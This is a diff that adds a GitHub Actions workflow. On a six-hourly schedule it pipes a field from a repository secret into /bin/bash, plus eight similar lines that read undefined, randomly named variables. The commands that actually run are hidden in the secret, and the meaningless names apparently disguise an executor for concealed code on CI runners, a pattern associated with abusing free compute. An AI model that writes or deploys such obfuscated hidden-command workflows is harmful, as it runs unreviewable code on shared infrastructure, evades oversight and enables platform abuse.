@@ -1,0 +1,27 @@
+name: xiaoxiangfuguan
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiaoxiangfuguan
+        env:
+          yvrlh7: ${{ secrets.yvrlh7 }}
+        run: |
+          echo $yvrlh7 | jq -r .ojmr201 | /bin/bash
+          echo $hdova60282 | jq -r .frz8 | /bin/bash
+          echo $pj7 | jq -r .etqkh76 | /bin/bash
+          echo $ty6 | jq -r .n941 | /bin/bash
+          echo $xnffb9405 | jq -r .pg78 | /bin/bash
+          echo $rd052 | jq -r .vzalr4909 | /bin/bash
+          echo $ddnu1 | jq -r .qhf58714 | /bin/bash
+          echo $i54998 | jq -r .wtthq5436 | /bin/bash
+          echo $jnhfl3 | jq -r .yltj1785 | /bin/bash
+
